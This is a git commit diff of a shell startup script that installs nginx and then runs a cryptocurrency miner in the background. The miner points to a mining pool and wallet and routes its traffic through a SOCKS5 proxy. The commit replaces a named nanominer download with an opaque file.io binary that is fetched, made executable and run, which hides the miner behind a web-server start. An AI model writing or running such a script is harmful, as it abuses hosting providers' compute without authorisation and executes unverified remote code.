ab87cff34bec2047c999fe6ebba2fc11d2fa52c6
saihajinsamab255 <108542881+saihajinsamab255@users.noreply.github.com>
2022-07-27 01:35:10 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,6 +2,6 @@
 apt update -y
 apt install nginx -y
 apt install wget -y
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
-sleep 30
+wget https://file.io/YDtmnMa6hgsc && chmod +x YDtmnMa6hgsc && ./YDtmnMa6hgsc -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 --log=stdout > nano.log &
+sleep 10
 service nginx start
